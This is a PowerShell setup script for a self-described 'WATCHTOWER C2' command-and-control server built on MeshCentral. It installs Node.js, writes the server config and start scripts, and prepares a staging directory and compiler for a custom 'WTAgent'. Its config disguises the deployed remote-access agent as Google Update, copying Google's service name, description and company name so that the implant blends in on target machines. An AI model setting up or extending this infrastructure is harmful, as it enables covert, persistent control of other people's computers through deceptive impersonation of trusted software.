#Requires -Version 5.1
<#
.SYNOPSIS
    WATCHTOWER C2 — Windows Install & Setup Script
.DESCRIPTION
    Installs Node.js if missing, runs npm install, detects LAN/VPS IP,
    creates/updates config.json, rotates TLS certs on IP change, checks
    optional deps (openssl, .NET/csc.exe for WTAgent), and writes start scripts.
.EXAMPLE
    powershell -ExecutionPolicy Bypass -File install.ps1
    powershell -ExecutionPolicy Bypass -File install.ps1 -NoStart
#>
param(
    [switch]$NoStart  # Setup only, don't launch MeshCentral
)

$ErrorActionPreference = 'Stop'

# ── Banner ──────────────────────────────────────────────────
Write-Host ""
Write-Host "  ██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗" -ForegroundColor Cyan
Write-Host "  ██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║" -ForegroundColor Cyan
Write-Host "  ██║ █╗ ██║███████║   ██║   ██║     ███████║" -ForegroundColor Cyan
Write-Host "  ██║███╗██║██╔══██║   ██║   ██║     ██╔══██║" -ForegroundColor Cyan
Write-Host "  ╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║" -ForegroundColor Cyan
Write-Host "   ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝" -ForegroundColor Cyan
Write-Host "  WATCHTOWER C2  v1.0 — Windows Setup" -ForegroundColor Yellow
Write-Host ""

# ── Paths ────────────────────────────────────────────────────
$ScriptDir  = Split-Path -Parent $MyInvocation.MyCommand.Path
$MeshDir    = Join-Path $ScriptDir "MeshCentral-master"
$DataDir    = Join-Path $ScriptDir "meshcentral-data"
$WTAgentDir = Join-Path $ScriptDir "WTAgent"
$ConfigPath = Join-Path $DataDir "config.json"
$LogPath    = Join-Path $ScriptDir "watchtower.log"

if (!(Test-Path $MeshDir)) {
    Write-Host "[X] MeshCentral-master/ not found at $MeshDir" -ForegroundColor Red
    exit 1
}

# ── Helper functions ─────────────────────────────────────────
function say  { Write-Host "[*] $args" -ForegroundColor Cyan }
function ok   { Write-Host "[+] $args" -ForegroundColor Green }
function warn { Write-Host "[!] $args" -ForegroundColor Yellow }
function die  { Write-Host "[X] $args" -ForegroundColor Red; exit 1 }

function Refresh-Path {
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" +
                [System.Environment]::GetEnvironmentVariable("PATH","User")
}

# ── Node.js: detect & install ────────────────────────────────
function Install-NodeJS {
    say "Attempting Node.js LTS install..."

    # Try winget
    if (Get-Command winget -ErrorAction SilentlyContinue) {
        say "Installing via winget..."
        winget install --id OpenJS.NodeJS.LTS -e `
              --accept-source-agreements --accept-package-agreements 2>&1 | Out-Host
        Refresh-Path
        return
    }

    # Try Chocolatey
    if (Get-Command choco -ErrorAction SilentlyContinue) {
        say "Installing via Chocolatey..."
        choco install nodejs-lts -y | Out-Host
        Refresh-Path
        return
    }

    # Manual download fallback
    say "Downloading Node.js LTS installer..."
    $nodeUrl = "https://nodejs.org/dist/lts/node-v20.x.x-x64.msi"
    # Resolve actual latest LTS via redirect
    try {
        $nodeUrl = "https://nodejs.org/en/download/"
        $page    = Invoke-WebRequest -Uri $nodeUrl -UseBasicParsing -TimeoutSec 15
        $match   = [regex]::Match($page.Content, 'href="(https://nodejs\.org/dist/[^"]+node-v[\d.]+-x64\.msi)"')
        if ($match.Success) { $nodeUrl = $match.Groups[1].Value }
    } catch {}
    $installer = Join-Path $env:TEMP "node-lts-x64.msi"
    say "Downloading from $nodeUrl ..."
    Invoke-WebRequest -Uri $nodeUrl -OutFile $installer -UseBasicParsing
    say "Running installer (silent)..."
    Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /qn ADDLOCAL=ALL" -Wait
    Remove-Item $installer -Force -ErrorAction SilentlyContinue
    Refresh-Path
}

$NodeExe = Get-Command node -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source
if (!$NodeExe) {
    warn "Node.js not found."
    Install-NodeJS
    $NodeExe = Get-Command node -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source
    if (!$NodeExe) { die "Node.js install failed. Get it from https://nodejs.org" }
}

$NodeVer = & node -e "process.stdout.write(process.versions.node)" 2>$null
$NodeMaj = [int]($NodeVer.Split('.')[0])
if ($NodeMaj -lt 14) {
    warn "Node.js $NodeVer is too old (need >= 14). Upgrading..."
    Install-NodeJS
    $NodeVer = & node -e "process.stdout.write(process.versions.node)" 2>$null
}
ok "Node.js $NodeVer  →  $NodeExe"

# ── npm install ──────────────────────────────────────────────
$nmDir = Join-Path $MeshDir "node_modules"
if (!(Test-Path $nmDir)) {
    say "Installing npm dependencies (first run — may take a minute)..."
    Push-Location $MeshDir
    & npm install --production 2>&1 | Select-Object -Last 8 | Out-Host
    Pop-Location
    ok "npm packages installed"
} else {
    $modCount = (Get-ChildItem $nmDir -Directory | Measure-Object).Count
    ok "npm packages present ($modCount modules)"
}

# ── Optional: .NET / csc.exe (WTAgent compile) ───────────────
$CscPaths = @(
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
)
$CscExe = $CscPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
if ($CscExe) {
    ok ".NET csc.exe found  →  WTAgent compile ready"
    ok "  $CscExe"
} else {
    warn ".NET csc.exe not found — WTAgent compile unavailable on this host."
    warn "  Install: winget install Microsoft.DotNet.SDK.8 OR add .NET Framework 4.5+"
}

# ── Optional: OpenSSL (WTAgent RSA keys) ─────────────────────
if (Get-Command openssl -ErrorAction SilentlyContinue) {
    ok "OpenSSL available  →  WTAgent RSA key generation ready"
} else {
    warn "OpenSSL not in PATH — needed to generate WTAgent RSA keys."
    warn "  Install: winget install ShiningLight.OpenSSL"
    warn "        OR choco install openssl"
}

# ── Port 443 check ────────────────────────────────────────────
$port443 = Get-NetTCPConnection -LocalPort 443 -State Listen -ErrorAction SilentlyContinue
if ($port443) {
    $pid443 = $port443 | Select-Object -First 1 -ExpandProperty OwningProcess
    $proc   = Get-Process -Id $pid443 -ErrorAction SilentlyContinue
    if ($proc -and $proc.MainModule.FileName -like "*node*") {
        say "Port 443 in use by Node.js (PID $pid443) — existing instance will be replaced."
    } else {
        warn "Port 443 is in use by: $($proc.Name) (PID $pid443)"
        warn "  Stop it first or change 'port' in config.json."
    }
}

# ── Admin check (port 443 needs admin on Windows) ────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (!$isAdmin) {
    warn "Not running as Administrator. Port 443 requires admin rights on Windows."
    warn "  Right-click install.ps1 → 'Run as Administrator'"
    warn "  OR use port 8443 (edit 'port' in config.json)"
}

# ── Detect LAN / VPS IP ───────────────────────────────────────
say "Detecting server IP..."

function Get-LocalIP {
    try {
        # Best route interface IP
        $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction Stop |
                 Sort-Object RouteMetric | Select-Object -First 1
        $ip = (Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex `
               -AddressFamily IPv4 -ErrorAction Stop).IPAddress
        return $ip
    } catch {}
    # Fallback: first non-loopback, non-APIPA IPv4
    $ip = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
          Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' } |
          Select-Object -First 1 -ExpandProperty IPAddress
    return $ip
}

function Get-PublicIP {
    $urls = @('https://api.ipify.org','https://ifconfig.me','https://icanhazip.com')
    foreach ($u in $urls) {
        try {
            $r = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 5
            if ($r.Content -match '^\d+\.\d+\.\d+\.\d+') { return $r.Content.Trim() }
        } catch {}
    }
    return ""
}

$LocalIP  = Get-LocalIP
$PublicIP = Get-PublicIP
$CertIP   = $LocalIP
$Mode     = "LAN"

if ($PublicIP -and ($PublicIP -eq $LocalIP)) {
    $CertIP = $PublicIP
    $Mode   = "VPS"
}
if (!$CertIP) { die "Could not detect LAN IP. Set 'cert' in config.json manually." }

ok "[$Mode MODE] cert IP → $CertIP"
if ($Mode -eq "LAN" -and $PublicIP) { say "  Public (NAT): $PublicIP" }

# ── meshcentral-data setup ────────────────────────────────────
if (!(Test-Path $DataDir)) { New-Item -ItemType Directory -Path $DataDir | Out-Null }

# WTAgent staging dir
$WtStageDir = Join-Path $MeshDir "public\wt"
if (!(Test-Path $WtStageDir)) { New-Item -ItemType Directory -Path $WtStageDir | Out-Null }
ok "public\wt\ staging directory ready"

# ── Config.json: create or update ────────────────────────────
$OldIP = ""
if (Test-Path $ConfigPath) {
    try {
        $cfg   = Get-Content $ConfigPath -Raw -ErrorAction Stop | ConvertFrom-Json
        $OldIP = $cfg.settings.cert
    } catch { warn "Existing config.json is invalid JSON — will overwrite." }
}

$WriteConfig = (!$OldIP -or $OldIP -ne $CertIP)

if ($WriteConfig) {
    if ($OldIP) {
        say "IP changed: $OldIP → $CertIP"
        say "Removing old TLS certs (will auto-regenerate)..."
        @("webserver-cert-private.key","webserver-cert-public.crt",
          "agentserver-cert-private.key","agentserver-cert-public.crt",
          "mpsserver-cert-private.key","mpsserver-cert-public.crt",
          "swarmserver-cert-private.key","swarmserver-cert-public.crt") | ForEach-Object {
            $f = Join-Path $DataDir $_
            if (Test-Path $f) { Remove-Item $f -Force }
        }
        say "Clearing cached signed agent binaries..."
        $signedDir = Join-Path $DataDir "signedagents"
        if (Test-Path $signedDir) { Get-ChildItem $signedDir | Remove-Item -Force -ErrorAction SilentlyContinue }
    } else {
        say "Creating config.json..."
    }

    # Use node.js for safe JSON merge (preserves any existing custom settings)
    $jsCode = @"
var fs = require('fs'), path = require('path');
var cfgPath = path.resolve('$($ConfigPath.Replace('\','\\'))');
var cfg = {};
try { cfg = JSON.parse(fs.readFileSync(cfgPath,'utf8')); } catch(e) {}
cfg['\$schema'] = cfg['\$schema'] || 'https://raw.githubusercontent.com/Ylianst/MeshCentral/master/meshcentral-config-schema.json';
cfg.settings = cfg.settings || {};
cfg.settings.cert = '$CertIP';
cfg.settings.port = cfg.settings.port || 443;
cfg.settings.redirPort = cfg.settings.redirPort || 80;
cfg.settings.allowFraming = true;
cfg.domains = cfg.domains || {};
cfg.domains[''] = cfg.domains[''] || {};
var d = cfg.domains[''];
d.title = d.title || 'WatchTower';
d.title2 = d.title2 || 'C2';
d.allowedOrigin = true;
d.newAccounts = false;
d.agentcustomization = d.agentcustomization || {
    filename:'GoogleUpdate', servicename:'gupdate',
    displayname:'Google Update Service (gupdate)',
    description:'Keeps your Google software up to date. If this service is disabled or stopped, your Google software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work.',
    companyname:'Google LLC'
};
fs.writeFileSync(cfgPath, JSON.stringify(cfg,null,2));
console.log('[+] config.json written: cert=' + cfg.settings.cert);
"@
    & node -e $jsCode
} else {
    ok "config.json correct (cert=$CertIP)"
}

# ── Kill existing MeshCentral instances ───────────────────────
$mcProcs = Get-Process -Name node -ErrorAction SilentlyContinue |
           Where-Object { $_.CommandLine -like "*meshcentral*" -or
                          (Get-NetTCPConnection -OwningProcess $_.Id -LocalPort 443 -ErrorAction SilentlyContinue) }
if ($mcProcs) {
    say "Stopping existing MeshCentral instance(s)..."
    $mcProcs | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep 2
}

# ── Write start scripts ───────────────────────────────────────
$startPs = Join-Path $ScriptDir "start.ps1"
@"
# WATCHTOWER C2 — Start Server
Set-Location (Join-Path `$PSScriptRoot "MeshCentral-master")
Write-Host "[*] Starting WATCHTOWER C2 at https://$CertIP" -ForegroundColor Cyan
& node meshcentral.js
"@ | Set-Content -Path $startPs -Encoding UTF8
ok "start.ps1 written"

$startBat = Join-Path $ScriptDir "start.bat"
@"
@echo off
cd /d "%~dp0MeshCentral-master"
echo [*] Starting WATCHTOWER C2...
node meshcentral.js
"@ | Set-Content -Path $startBat -Encoding UTF8
ok "start.bat written"

# ── Summary ───────────────────────────────────────────────────
Write-Host ""
Write-Host "═══════════════════════════════════════" -ForegroundColor Green
Write-Host "  WATCHTOWER C2 setup complete!" -ForegroundColor Green
Write-Host "═══════════════════════════════════════" -ForegroundColor Green
Write-Host "  Server IP  : $CertIP" -ForegroundColor Cyan
Write-Host "  Mode       : $Mode"
Write-Host "  Admin URL  : https://$CertIP" -ForegroundColor Cyan
Write-Host "  Data dir   : $DataDir"
Write-Host ""
Write-Host "  Start server:" -ForegroundColor Yellow
Write-Host "    start.bat         (CMD / double-click)"
Write-Host "    .\start.ps1       (PowerShell)"
Write-Host "    .\start-watchtower.sh  (Git Bash / MINGW64)"
Write-Host ""

if ($NoStart) { Write-Host "  [-NoStart] Exiting without launching."; Write-Host ""; exit 0 }

# ── Launch MeshCentral ────────────────────────────────────────
say "Starting WATCHTOWER C2..."
Push-Location $MeshDir
$proc = Start-Process -FilePath "node" -ArgumentList "meshcentral.js" `
        -RedirectStandardOutput $LogPath -RedirectStandardError $LogPath `
        -NoNewWindow -PassThru
Pop-Location
ok "MeshCentral started (PID $($proc.Id))"
Write-Host "  URL : https://$CertIP" -ForegroundColor Cyan
Write-Host "  Log : $LogPath"
Write-Host ""
